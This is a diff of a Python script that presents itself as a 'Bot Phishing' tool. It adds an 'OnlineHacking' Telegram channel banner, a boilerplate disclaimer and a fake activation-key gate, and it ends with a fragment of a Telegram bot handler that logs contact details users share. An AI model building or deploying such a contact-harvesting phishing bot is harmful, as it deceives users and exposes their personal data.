@@ -1,13 +1,36 @@
 import colorama
 from colorama import Fore, Back, Style
 import os
+import time
 
 correct_number = "12"
+os.system('clear')
+print(' ')
+print(' ')
+print("\033[48;5;330m[\033[1m*\033[0m]\033[1;40m\033[10m OnlineHacking :\033[1;32m Join Telegram Channel \033[1;33m @OnlineHacking  !\033[0m")
+print(" ")
+time.sleep(5)
+os.system('clear')
+print(" ")
+print(" ")
+print("             \033[91m|===========================|")
+print("            [¤]   \033[1;33mD I S C L A I M E R\033[91m   [¤]")
+print("             \033[91m|===========================|\n\n")
+print("\n")
+print("\033[91m[!]  \033[1;32m• This tool you are going to use at your risk,\n\n• Developers and Publisher of Bot Phishing are not responsible for any kind of hack and stuff.\n\n• Phishing is illegal if you are using it offensively\n\n• Developers assume NO liability and are NOT responsible for any damage caused by this program\n\n• software to test a device, company, or any other type of target without WRITTEN PERMISSION from them.\n\n")
+print("\n")
+print("\n")
+print("\033[31m[\033[32m★\033[31m]\033[93m This Tool is only for educational purposes, and we are not responsible for any kind of illegal activity done with this tool\033[0m ")
+print("\n")
+print("\n")
+input(Fore.GREEN + '\033[1;40m\033[31m[\033[32m*\033[31m]\033[96m Press Enter to Accepted Disclaimer \033[1;91m : \033[0m')
+print("\n")
+print("\n")
 os.system('clear')
 print(Fore.RED + '''
          _,.-------.,_
     ''')
-user_input = input(Fore.GREEN + "Enter a number: ")
+user_input = input(Fore.GREEN + "\033[1;40m\033[31m[\033[32m*\033[31m]\033[96m Enter Activation Key: \033[0m")
 if "12" in user_input:
     print('Correct! You entered a number containing 12')
     os.system('clear')
@@ -672,8 +695,7 @@ def contact(message):
 		print(info)
 
 		if message.contact.user_id != message.chat.id:
-			bot.send_message(message.chat.id, '❌ Authorize Your contact!')
-	
+			bot.send_message(message.chat.id, '❌ Authorize Your contact!')	
 bot.polling()
         """)
         f.close()
